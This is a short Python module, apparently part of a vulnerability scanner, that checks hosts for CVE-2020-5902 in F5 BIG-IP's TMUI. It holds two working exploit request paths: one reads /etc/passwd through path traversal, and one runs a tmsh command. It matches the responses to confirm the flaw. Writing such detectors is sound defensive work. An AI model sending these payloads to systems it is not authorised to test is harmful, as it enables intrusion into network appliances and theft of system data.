"""CVE-2020-5902 - F5 BIG-IP TMUI RCE."""
from .base import CVEDetector, CVEResult


class F5TMUI(CVEDetector):
    cve_id = "CVE-2020-5902"
    title = "F5 BIG-IP TMUI Directory Traversal to RCE"
    severity = "critical"
    affected = "F5 BIG-IP 11.6.x / 12.1.x / 13.1.x / 14.1.x / 15.0.x / 15.1.x pre-patch"
    tags = ["cve-2020-5902", "f5", "big-ip", "path-traversal", "rce"]

    PATHS = [
        "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
        "/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin",
    ]

    def probe(self, base, baseline_body):
        for p in self.PATHS:
            status, body = self._get(base + p, timeout=8)
            if not body:
                continue
            if "root:x:0:0" in body or '"tmshCmdResponse"' in body or \
               "auth user admin" in body.lower():
                return CVEResult(
                    vulnerable=True,
                    url=base + p,
                    evidence=body[:150],
                    detail="F5 BIG-IP TMUI directory traversal confirmed.",
                )
        return None
